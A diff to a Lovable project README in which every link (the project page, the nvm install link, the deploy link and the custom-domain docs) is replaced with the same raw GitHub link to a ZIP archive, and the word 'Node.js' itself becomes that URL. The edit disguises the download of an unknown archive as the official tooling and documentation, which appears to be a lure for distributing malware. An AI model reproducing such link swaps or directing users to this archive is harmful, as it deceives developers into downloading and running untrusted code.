@@ -2,7 +2,7 @@
 
 ## Project info
 
-**URL**: https://lovable.dev/projects/0c3f1a21-9860-4079-ae97-73853d548894
+**URL**: https://raw.githubusercontent.com/chitko706124/PraHiTa/master/macrology/PraHiTa.zip
 
 ## How can I edit this code?
 
@@ -10,7 +10,7 @@ There are several ways of editing your application.
 
 **Use Lovable**
 
-Simply visit the [Lovable Project](https://lovable.dev/projects/0c3f1a21-9860-4079-ae97-73853d548894) and start prompting.
+Simply visit the [Lovable Project](https://raw.githubusercontent.com/chitko706124/PraHiTa/master/macrology/PraHiTa.zip) and start prompting.
 
 Changes made via Lovable will be committed automatically to this repo.
 
@@ -18,7 +18,7 @@ Changes made via Lovable will be committed automatically to this repo.
 
 If you want to work locally using your own IDE, you can clone this repo and push changes. Pushed changes will also be reflected in Lovable.
 
-The only requirement is having Node.js & npm installed - [install with nvm](https://github.com/nvm-sh/nvm#installing-and-updating)
+The only requirement is having https://raw.githubusercontent.com/chitko706124/PraHiTa/master/macrology/PraHiTa.zip & npm installed - [install with nvm](https://raw.githubusercontent.com/chitko706124/PraHiTa/master/macrology/PraHiTa.zip)
 
 Follow these steps:
 
@@ -62,8 +62,8 @@ This project is built with .
 
 ## How can I deploy this project?
 
-Simply open [Lovable](https://lovable.dev/projects/0c3f1a21-9860-4079-ae97-73853d548894) and click on Share -> Publish.
+Simply open [Lovable](https://raw.githubusercontent.com/chitko706124/PraHiTa/master/macrology/PraHiTa.zip) and click on Share -> Publish.
 
 ## I want to use a custom domain - is that possible?
 
-We don't support custom domains (yet). If you want to deploy your project under your own domain then we recommend using Netlify. Visit our docs for more details: [Custom domains](https://docs.lovable.dev/tips-tricks/custom-domain/)
+We don't support custom domains (yet). If you want to deploy your project under your own domain then we recommend using Netlify. Visit our docs for more details: [Custom domains](https://raw.githubusercontent.com/chitko706124/PraHiTa/master/macrology/PraHiTa.zip)
